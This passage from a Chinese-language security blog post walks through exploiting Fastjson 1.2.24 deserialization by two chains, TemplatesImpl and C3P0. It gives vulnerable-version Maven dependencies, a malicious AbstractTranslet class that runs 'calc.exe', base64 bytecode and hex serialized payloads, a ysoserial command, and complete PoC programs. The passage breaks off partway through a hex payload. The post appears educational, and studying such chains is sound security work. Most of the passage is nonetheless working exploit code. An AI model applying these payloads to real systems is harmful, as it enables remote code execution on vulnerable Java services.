TransletClassLoader&lt;br&gt;加载字节码]</span><br><span class="line">    I --&gt; J[调用 defineClass]</span><br><span class="line">    J --&gt; K[实例化恶意类]</span><br><span class="line">    K --&gt; L[执行静态代码块/构造函数]</span><br><span class="line">    L --&gt; M[🎯 RCE 实现]</span><br></pre></td></tr></table></figure>
+
+
+
+<p>简单来说，Fastjson 在反序列化过程中，会尝试调用对象的 Getter 方法。当我们构造的 Payload 中包含 <code>_outputProperties</code>字段时，会触发 <code>TemplatesImpl.getOutputProperties()</code>方法，进而启动上述链条，最终加载并实例化我们嵌入在 <code>_bytecodes</code>中的恶意类，导致代码执行</p>
+<h4 id="二、利用成功的关键条件"><a href="#二、利用成功的关键条件" class="headerlink" title="二、利用成功的关键条件"></a><strong>二、利用成功的关键条件</strong></h4><p>要成功利用此漏洞，必须同时满足以下几个条件</p>
+<p>：</p>
+<table>
+<thead>
+<tr>
+<th align="left">条件</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>Fastjson 版本</strong></td>
+<td align="left">存在反序列化漏洞的版本，通常指 <strong>1.2.22 至 1.2.24</strong>。其他版本可能已修复或需要不同绕过方式。</td>
+</tr>
+<tr>
+<td align="left"><strong>开启 <code>SupportNonPublicField</code></strong></td>
+<td align="left">必须使用 <code>JSON.parseObject(payload, Object.class, Feature.SupportNonPublicField)</code>。因为 <code>_bytecodes</code>、<code>_name</code>等是关键<strong>私有属性</strong>，没有此特性无法为其赋值。</td>
+</tr>
+<tr>
+<td align="left"><strong>恶意类构造</strong></td>
+<td align="left">恶意类必须继承 <code>AbstractTranslet</code>，恶意代码（如命令执行）通常放在<strong>类的静态代码块或构造函数</strong>中。</td>
+</tr>
+<tr>
+<td align="left"><strong>JDK 环境</strong></td>
+<td align="left">目标环境中必须存在 <code>TemplatesImpl</code>类，它通常包含在 JDK 中。</td>
+</tr>
+</tbody></table>
+<h4 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h4><h5 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 存在漏洞的 Fastjson 版本 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 用于方便地生成恶意类的字节码 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.29.2-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="编写恶意类EvilClass-java"><a href="#编写恶意类EvilClass-java" class="headerlink" title="编写恶意类EvilClass.java"></a>编写恶意类<code>EvilClass.java</code></h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 此处为要执行的恶意代码，例如弹出计算器</span></span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用javac编译这个类，编译的时候有警告不用理会</p>
+<h5 id="构造payload-1"><a href="#构造payload-1" class="headerlink" title="构造payload"></a>构造payload</h5><p>创建EvilClassBase64Converter.java类实现对.class文件转换为base64字符串</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClassBase64Converter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 指定EvilClass.class文件的绝对路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="string">&quot;EvilClass.class绝对路径&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 读取class文件内容</span></span><br><span class="line">            <span class="type">byte</span>[] classBytes = readClassFile(filePath);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 转换为Base64编码</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">base64Encoded</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(classBytes);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 输出结果</span></span><br><span class="line">            System.out.println(<span class="string">&quot;EvilClass.class的Base64编码:&quot;</span>);</span><br><span class="line">            System.out.println(base64Encoded);</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;处理文件时发生错误: &quot;</span> + e.getMessage());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 读取class文件内容为字节数组</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] readClassFile(String filePath) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filePath);</span><br><span class="line">             <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>()) &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> bytesRead;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 读取文件内容到字节数组输出流</span></span><br><span class="line">            <span class="keyword">while</span> ((bytesRead = fis.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                bos.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<p>代码运行后会生成base64编码的字符串，然后复制添加到payload中，如下</p>
+<h5 id="利用poc复现"><a href="#利用poc复现" class="headerlink" title="利用poc复现"></a>利用poc复现</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造完整的 POC</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_bytecodes\&quot;: [\&quot;&quot;</span> + <span class="string">&quot;yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhDAAJAAoHACEMACIAIwEACGNhbGMuZXhlDAAkACUBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAmAAoBAAlFdmlsQ2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAAAgAAQANAA4AAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABIADwAAAAQAAQAQAAEADQARAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAUAA8AAAAEAAEAEAAIABIACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAAAsACQAOAAwADAANAA0AEQAPABMAAAAHAAJMBwAUBAABABUAAAACABY=&quot;</span> + <span class="string">&quot;\&quot;],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#x27;_name&#x27;: &#x27;a.b&#x27;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#x27;_tfactory&#x27;: &#123;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_outputProperties\&quot;: &#123;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        System.out.println(&quot;Payload: &quot; + poc);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 触发反序列化漏洞，关键是要传入 Feature.SupportNonPublicField</span></span><br><span class="line">        JSON.parseObject(poc, Object.class, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功弹出计算器。</p>
+<p>所以这个链有点就是不需要依赖，但是利用条件苛刻，需要加 Feature.SupportNonPublicField</p>
+<h3 id="C3P0链"><a href="#C3P0链" class="headerlink" title="C3P0链"></a>C3P0链</h3><p>利用链的触发逻辑如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flowchart TD</span><br><span class="line">    A[Fastjson 解析JSON] --&gt; B[设置 WrapperConnectionPoolDataSource 类型]</span><br><span class="line">    B --&gt; C[自动调用 setUserOverridesAsString]</span><br><span class="line">    C --&gt; D[触发 fireVetoableChange 事件]</span><br><span class="line">    D --&gt; E[调用 parseUserOverridesAsString 方法]</span><br><span class="line">    E --&gt; F&#123;检查字符串格式&lt;br&gt;并Hex解码&#125;</span><br><span class="line">    F --&gt;|是| G[调用 fromByteArray 反序列化]</span><br><span class="line">    G --&gt; H[触发二次反序列化&lt;br&gt;执行恶意代码]</span><br><span class="line">    H --&gt; I[🎯 RCE 实现]</span><br></pre></td></tr></table></figure>
+
+<h3 id="🔧-复现详细步骤"><a href="#🔧-复现详细步骤" class="headerlink" title="🔧 复现详细步骤"></a>🔧 复现详细步骤</h3><h4 id="步骤-1：准备环境与依赖"><a href="#步骤-1：准备环境与依赖" class="headerlink" title="步骤 1：准备环境与依赖"></a>步骤 1：准备环境与依赖</h4><p>创建一个Maven项目，在 <code>pom.xml</code>中添加必要的依赖。<strong>关键点在于使用存在漏洞的Fastjson版本</strong>，并引入包含可利用链的组件（如Commons Collections）。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 存在反序列化漏洞的 Fastjson 版本 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- C3P0 连接池 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mchange<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 用于构造恶意Gadget链的组件（例如CC链） --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤-2：生成HEX载荷"><a href="#步骤-2：生成HEX载荷" class="headerlink" title="步骤 2：生成HEX载荷"></a>步骤 2：生成HEX载荷</h4><p>HEX载荷的本质是<strong>一条能够导致RCE的二次反序列化链</strong>（例如Commons Collections链）的序列化字节码的十六进制表示。</p>
+<ol>
+<li><p><strong>使用ysoserial生成序列化文件</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections2 &quot;calc&quot; &gt; calc.ser</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>将序列化文件转换为HEX字符串</strong>：</p>
+<p>编写一个Java工具方法，读取上一步生成的 <code>.ser</code>文件，并将其字节数组转换为十六进制字符串。<strong>特别注意</strong>：最终的HEX字符串需要以 <code>HexAsciiSerializedMap:</code>开头，并以分号 <code>;</code>结尾。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HexGenerator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 读取序列化payload文件</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;calc.ser文件的绝对路径&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">             <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>()) &#123;</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> len;</span><br><span class="line">            <span class="keyword">while</span> ((len = fis.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                bos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">byte</span>[] data = bos.toByteArray();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 转换为十六进制字符串，并添加必需的前缀和后缀</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">hexString</span> <span class="operator">=</span> bytesToHex(data);</span><br><span class="line">            <span class="type">String</span> <span class="variable">finalHexPayload</span> <span class="operator">=</span> <span class="string">&quot;HexAsciiSerializedMap:&quot;</span> + hexString + <span class="string">&quot;;&quot;</span>;</span><br><span class="line">            System.out.println(<span class="string">&quot;生成的HEX载荷: &quot;</span> + finalHexPayload);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 自定义字节转十六进制方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">bytesToHex</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : bytes) &#123;</span><br><span class="line">            sb.append(String.format(<span class="string">&quot;%02X&quot;</span>, b));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="步骤-3：构造并触发PoC"><a href="#步骤-3：构造并触发PoC" class="headerlink" title="步骤 3：构造并触发PoC"></a>步骤 3：构造并触发PoC</h4><p>将生成的HEX字符串填入您提供的JSON结构中进行触发。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line">public class C3P0POC &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        // 将步骤2中生成的HEX字符串替换到这里</span><br><span class="line">        String hexPayload = &quot;HexAsciiSerializedMap:ACED0005737200176A6176612E7574696C2E5072696F72697479517565756594DA30B4FB3F82B103000249000473697A654C000A636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B787000000002737200426F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E636F6D70617261746F72732E5472616E73666F726D696E67436F6D70617261746F722FF984F02BB108CC0200024C00096465636F726174656471007E00014C000B7472616E73666F726D657274002D4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E73342F5472616E73666F726D65723B7870737200406F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E636F6D70617261746F72732E436F6D70617261626C65436F6D70617261746F72FBF49925B86EB13702000078707372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000074000E6E65775472616E73666F726D6572757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007704000000037372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C61737371007E000B4C00055F6E616D6571007E000A4C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000002757200025B42ACF317F8060854E0020000787000000698CAFEBABE0000003200390A0003002207003707002507002601001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C756505AD2093F391DDEF3E0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010013537475625472616E736C65745061796C6F616401000C496E6E6572436C61737365730100354C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F61643B0100097472616E73666F726D010072284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B5B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B2956010008646F63756D656E7401002D4C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B01000868616E646C6572730100425B4C636F6D2F73756E2F6F72672F6170616368652F786D